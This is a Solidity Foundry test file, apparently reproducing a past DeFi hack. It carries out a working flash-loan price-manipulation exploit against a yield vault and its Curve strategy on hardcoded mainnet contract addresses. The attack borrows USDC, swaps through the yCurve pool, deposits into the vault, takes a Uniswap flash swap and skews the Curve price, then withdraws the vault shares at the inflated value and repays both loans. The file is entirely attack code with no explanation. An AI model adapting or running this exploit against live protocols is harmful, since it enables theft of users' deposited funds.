// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./IERC20.sol";
import "./ILendingPool.sol";
import "./ILendingPoolAddressesProvider.sol";

interface HVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}

interface yCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract ExploitTest is Test {
    ILendingPoolAddressesProvider public addressesProvider;

    // HVault
    HVault constant h = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    
    // CurveStrategy
    address constant c = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;
    
    // yCurve
    yCurve constant y = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    UniSwapV2 constant uUSDT = UniSwapV2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    UniSwapV2 constant uUSDC = UniSwapV2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address constant lendingPoolCore = 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3;

    function setUp() public {
        addressesProvider = ILendingPoolAddressesProvider(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8);
    }

    function testExploit() public {
        // flash loan USDC
        uint amount = usdc.balanceOf(lendingPoolCore);
        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), address(usdc), amount, hex"");

        // emit log_named_decimal_uint("final USDT balance", usdt.balanceOf(address(this)), 6);
        // emit log_named_decimal_uint("final USDC balance", usdc.balanceOf(address(this)), 6);
    }

    function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes calldata _params) external {
        emit log_named_decimal_uint("to repay", _amount + _fee, 6);

        emit log_named_decimal_uint("USDT balance 0", usdt.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("USDC balance 0", usdc.balanceOf(address(this)), 6);
        uint256 remainValue = _amount + _fee;
        console.log("usdc amount + _fee:" , remainValue);

        // USDC -> USDT
        usdc.approve(address(y), type(uint256).max);
        y.exchange_underlying(1, 2, 10000000 * 1e6, 0);

        uint256 usdtBalance = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("USDT balance 1", usdt.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("USDC balance 1", usdc.balanceOf(address(this)), 6);
        
        usdt.approve(address(h), type(uint256).max);
        h.deposit(usdt.balanceOf(address(this)));

        // flash swap USDT
        console.log(usdt.balanceOf(address(uUSDT)));
        console.log(usdtBalance);
        uUSDT.swap(0, usdtBalance , address(this), hex"00");
        // emit log("flash swap done");

        emit log_named_decimal_uint("USDT balance 3", usdt.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("USDC balance 3", usdc.balanceOf(address(this)), 6);
        y.exchange_underlying(2, 1, usdt.balanceOf(address(this)), 0);

        transferFundsBackToPoolInternal(_reserve, _amount + _fee);
        
        emit log_named_decimal_uint("final USDT balance", usdt.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("final USDC balance", usdc.balanceOf(address(this)), 6);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        emit log("uniswapV2Call");

        emit log_named_decimal_uint("USDT balance 2", usdt.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("USDC balance 2", usdc.balanceOf(address(this)), 6);
        


        // USDT -> USDC
        usdt.approve(address(y), type(uint256).max);
        y.exchange_underlying(2, 1, usdt.balanceOf(address(this)), 0);


        h.withdraw(h.balanceOf(address(this)));
        emit log_named_decimal_uint("USDT balance 2", usdt.balanceOf(address(this)), 6);

        usdt.transfer(address(uUSDT), amount1 * 1.00301 ether / 1 ether);
    }

    receive() payable external {}

    function transferFundsBackToPoolInternal(address _reserve, uint256 _amount) internal {
        address payable core = addressesProvider.getLendingPoolCore();
        transferInternal(core, _reserve, _amount);
    }

    function transferInternal(address payable _destination, address _reserve, uint256 _amount) internal {
        IERC20(_reserve).transfer(_destination, _amount);
    }

    function getBalanceInternal(address _target, address _reserve) internal view returns(uint256) {
        return IERC20(_reserve).balanceOf(_target);
    }
}